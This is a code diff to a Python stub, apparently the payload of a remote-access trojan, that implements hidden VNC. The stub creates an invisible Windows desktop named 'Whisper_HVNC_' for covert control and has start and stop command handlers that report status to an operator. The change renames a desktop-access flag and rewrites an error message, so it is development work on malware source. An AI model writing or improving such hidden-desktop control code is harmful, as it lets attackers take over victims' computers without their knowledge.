@@ -4,12 +4,13 @@ STUB_CODE = r"""
 _hvnc_name = "Whisper_HVNC_" + str(os.getpid())
 _hvnc_desk = None
 _hvnc_run = [False]
+_DESKTOP_ACCESS = 0x1000
 
 def _hvnc_thread():
     global _hvnc_desk
     import ctypes
     u32 = ctypes.windll.user32
-    desk = u32.CreateDesktopW(_hvnc_name, None, None, 0, 0x1000, None)
+    desk = u32.CreateDesktopW(_hvnc_name, None, None, 0, _DESKTOP_ACCESS, None)
     if not desk:
         _hvnc_desk = None; _hvnc_run[0] = False; return
     _hvnc_desk = desk; _hvnc_run[0] = True
@@ -31,7 +32,7 @@ def _cmd_hvnc_start(m):
     threading.Thread(target=_hvnc_thread, daemon=True).start()
     time.sleep(0.5)
     if _hvnc_desk: return {"output": f"[+] HVNC started on desktop '{_hvnc_name}'"}
-    return {"output": "[!] HVNC failed - create thread failed"}
+    return {"output": "[!] HVNC failed - create desktop failed (need interactive session with desktop creation rights)"}
 
 def _cmd_hvnc_stop(m):
     _hvnc_run[0] = False; return {"output": "[+] HVNC stopped"}
